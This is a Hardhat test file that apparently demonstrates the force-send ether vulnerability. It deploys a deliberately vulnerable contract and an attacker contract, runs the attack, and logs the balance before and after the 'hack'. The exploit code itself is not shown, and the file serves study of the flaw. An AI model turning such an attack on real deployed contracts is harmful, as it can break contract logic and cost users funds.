import type { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import chai, { expect } from "chai";
import chaiAsPromised from "chai-as-promised";
import { ethers } from "hardhat";

import { ForceSendVulnerable, ForceSendAttacker } from "../typechain-types";

chai.use(chaiAsPromised);

describe("ForceSend", () => {
    let deployer: SignerWithAddress;
    let attacker: SignerWithAddress;
    let forceSendVulnerable: ForceSendVulnerable;
    let forceSendAttacker: ForceSendAttacker;

    before(async () => {
        [deployer, attacker] = await ethers.getSigners();

        const ForceSendVulnerable = await ethers.getContractFactory("ForceSendVulnerable");
        forceSendVulnerable = await ForceSendVulnerable.deploy();
        await forceSendVulnerable.deployed();

        const ForceSendAttacker = await ethers.getContractFactory("ForceSendAttacker");
        forceSendAttacker = await ForceSendAttacker.deploy(forceSendVulnerable.address);
        await forceSendAttacker.deployed();
    });

    it("should be vulnerable to forceSend", async () => {
        await forceSendVulnerable.deposit({ value: ethers.utils.parseEther("1") });

        console.log("Game contract balance before the hack: ", (await ethers.provider.getBalance(forceSendVulnerable.address)).toString());
        console.log("...");

        console.log("Attacker is attacking...");
        await forceSendAttacker.connect(attacker).attack({ value: 123 });

        console.log("...");
        console.log("Game contract balance after the hack: ", (await ethers.provider.getBalance(forceSendVulnerable.address)).toString());
    });
});
